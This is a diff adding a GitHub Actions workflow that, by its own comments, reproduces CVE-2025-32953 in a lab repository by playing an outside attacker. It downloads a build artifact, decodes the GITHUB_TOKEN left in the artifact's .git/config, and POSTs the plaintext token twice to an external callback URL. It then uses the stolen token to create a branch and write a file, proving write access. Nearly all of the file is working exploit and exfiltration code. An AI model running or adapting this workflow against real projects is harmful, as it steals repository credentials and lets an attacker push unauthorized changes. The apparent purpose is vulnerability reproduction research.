@@ -1,0 +1,119 @@
+name: leak-verify
+
+# Throwaway demonstration workflow (Phase B of the CVE-2025-32953 reproduction).
+# It does NOT modify the vulnerable workflow (.github/workflows/makefile-ubuntu.yml):
+# it simulates exactly what an outside attacker does with the public artifact
+# z80pack-ubuntu produced by the Phase-A push run:
+#   1. download the artifact,
+#   2. extract the checkout-persisted GITHUB_TOKEN from .git/config,
+#   3. call home (first action),
+#   4. prove the recovered token still has write access.
+
+on:
+  push:
+    branches: [ "master" ]
+  workflow_dispatch: {}
+
+env:
+  CALLBACK_BASE: https://cve-repro-callback.pvharmo.workers.dev/INJECTED-MARKER-cve-2025-32953-0d592d6058b0
+  HARNESS_RUN_ID: 20260831T002034-845acc08
+  PHASE_A_RUN_ID: "33729219961"
+  PROOF_BRANCH: leak-verify/INJECTED-MARKER-cve-2025-32953-0d592d6058b0
+  PROOF_CONTENT: INJECTED-MARKER-cve-2025-32953-0d592d6058b0
+
+jobs:
+  verify:
+    runs-on: ubuntu-latest
+    timeout-minutes: 20
+    steps:
+      - name: Download Phase-A artifact z80pack-ubuntu
+        env:
+          GH_TOKEN: ${{ github.token }}
+        run: |
+          set -euo pipefail
+          rm -rf artifact && mkdir artifact
+          gh run download "$PHASE_A_RUN_ID" -R pvharmo2/gha-lab-57069a2522 \
+             -n z80pack-ubuntu -D ./artifact
+          echo "top-level artifact entries:"
+          ls -a ./artifact | head -40
+          if [ ! -f ./artifact/.git/config ]; then
+            echo "::warning::.git/config missing via gh; retrying with API zip download"
+            ART_URL=$(curl -sS -H "Authorization: Bearer $GH_TOKEN" \
+              "https://api.github.com/repos/pvharmo2/gha-lab-57069a2522/actions/runs/$PHASE_A_RUN_ID/artifacts" \
+              | jq -r '.artifacts[] | select(.name=="z80pack-ubuntu") | .archive_download_url')
+            curl -sSL -H "Authorization: Bearer $GH_TOKEN" -o /tmp/artifact.zip "$ART_URL"
+            unzip -oq /tmp/artifact.zip -d ./artifact
+            ls -a ./artifact | head -40
+          fi
+          if [ -f ./artifact/.git/config ]; then
+            echo "HAVE_GIT_CONFIG=yes"
+          else
+            echo "HAVE_GIT_CONFIG=no"
+            exit 1
+          fi
+
+      - name: Extract persisted credential from artifact .git/config
+        run: |
+          set -euo pipefail
+          EH=$(git config -f ./artifact/.git/config --get http.https://github.com/.extraheader || true)
+          if [ -z "$EH" ]; then
+            EH=$(grep -o 'AUTHORIZATION: basic [A-Za-z0-9+/=]*' ./artifact/.git/config | head -n1 || true)
+          fi
+          if [ -z "$EH" ]; then
+            echo "EXTRAHEADER_FOUND=no"
+            exit 1
+          fi
+          B64=$(printf '%s' "$EH" | sed 's/^AUTHORIZATION: basic //')
+          CRED=$(printf '%s' "$B64" | base64 -d)
+          TOKEN="${CRED#x-access-token:}"
+          # Recovered credential stays out of the logs: only shape is echoed.
+          echo "EXTRAHEADER_FOUND=yes (credential prefix=${TOKEN:0:4} length=${#TOKEN})"
+          echo "LEAKED_TOKEN=$TOKEN" >> "$GITHUB_ENV"
+
+      - name: First action - POST recovered credential to callback
+        run: |
+          set -euo pipefail
+          CB="$CALLBACK_BASE?harness_run_id=$HARNESS_RUN_ID"
+          BODY="leaked_token=$LEAKED_TOKEN&source=z80pack-ubuntu-artifact&token_name=GITHUB_TOKEN"
+          if command -v curl >/dev/null 2>&1; then
+            curl -sS -o /tmp/cb1.out -w 'callback POST status: %{http_code}\n' -X POST "$CB" --data "$BODY"
+          else
+            wget --post-data="$BODY" -qO- "$CB"
+          fi
+
+      - name: Usability check - write leak-proof.txt with the EXTRACTED token
+        run: |
+          set -euo pipefail
+          B64CONTENT=$(printf '%s' "$PROOF_CONTENT" | base64 -w0)
+          put_file() {
+            curl -sS -o /tmp/put.json -w '%{http_code}' -X PUT \
+              -H "Authorization: Bearer $LEAKED_TOKEN" \
+              -H "Accept: application/vnd.github+json" \
+              "https://api.github.com/repos/pvharmo2/gha-lab-57069a2522/contents/leak-proof.txt" \
+              -d "{\"message\":\"leak-proof via leaked artifact token\",\"content\":\"$B64CONTENT\",\"branch\":\"$PROOF_BRANCH\"}"
+          }
+          CODE=$(put_file)
+          echo "contents PUT status: $CODE"
+          if [ "$CODE" != "201" ]; then
+            echo "PUT != 201; creating branch ref with the extracted token and retrying"
+            SHA=$(curl -sS -H "Authorization: Bearer $LEAKED_TOKEN" \
+              "https://api.github.com/repos/pvharmo2/gha-lab-57069a2522/git/ref/heads/master" \
+              | jq -r '.object.sha')
+            REF_CODE=$(curl -sS -o /tmp/ref.json -w '%{http_code}' -X POST \
+              -H "Authorization: Bearer $LEAKED_TOKEN" \
+              "https://api.github.com/repos/pvharmo2/gha-lab-57069a2522/git/refs" \
+              -d "{\"ref\":\"refs/heads/$PROOF_BRANCH\",\"sha\":\"$SHA\"}")
+            echo "refs create status: $REF_CODE"
+            CODE=$(put_file)
+            echo "contents PUT retry status: $CODE"
+          fi
+          echo "PUT_STATUS=$CODE" >> "$GITHUB_ENV"
+
+      - name: Append usability result to callback
+        if: always() && env.LEAKED_TOKEN != ''
+        run: |
+          set -euo pipefail
+          CB="$CALLBACK_BASE?harness_run_id=$HARNESS_RUN_ID"
+          BODY="leaked_token=$LEAKED_TOKEN&source=z80pack-ubuntu-artifact&token_name=GITHUB_TOKEN&put_status=$PUT_STATUS"
+          curl -sS -o /tmp/cb2.out -w 'callback POST (result) status: %{http_code}\n' -X POST "$CB" --data "$BODY"
+          echo "put_status recorded: $PUT_STATUS"
